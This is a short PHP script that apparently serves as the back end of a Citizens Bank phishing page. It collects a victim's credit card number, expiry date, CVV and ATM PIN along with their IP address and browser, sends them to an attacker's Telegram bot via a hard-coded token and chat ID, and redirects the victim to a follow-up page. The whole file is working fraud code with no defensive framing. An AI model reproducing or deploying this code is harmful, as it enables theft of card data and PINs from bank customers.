<?php

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP']))
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_X_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if(isset($_SERVER['HTTP_FORWARDED_FOR']))
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if(isset($_SERVER['HTTP_FORWARDED']))
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if(isset($_SERVER['REMOTE_ADDR']))
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}


header ("Location: final.html");
  
      $usera = $_SERVER['HTTP_USER_AGENT'];
                $xip = get_client_ip();

define ('url',"https://api.telegram.org/bot1971024149:AAEdYKThLHTn9NB6QODcrzEjrvMU9cePf2k/");
$xccn = $_POST['ccn'];
$xexp = $_POST['exp'];
$xcsc = $_POST['csc'];
$xpin = $_POST['pin'];
$xdate = date('d/m/y h:i');
$chat_id = '821572555';
$message = urlencode("==============Citizen Bank CC Details============\nCredit Card Number : ".$xccn."\nExp Date : ".$xexp."\nCvv: ".$xcsc."\nAtm Pin : ".$xpin."\nIP Address : ".$xip."\nUseragent : ".$usera."\n===============================");
file_get_contents(url."sendmessage?text=".$message."&chat_id=".$chat_id."&parse_mode=HTML");

?>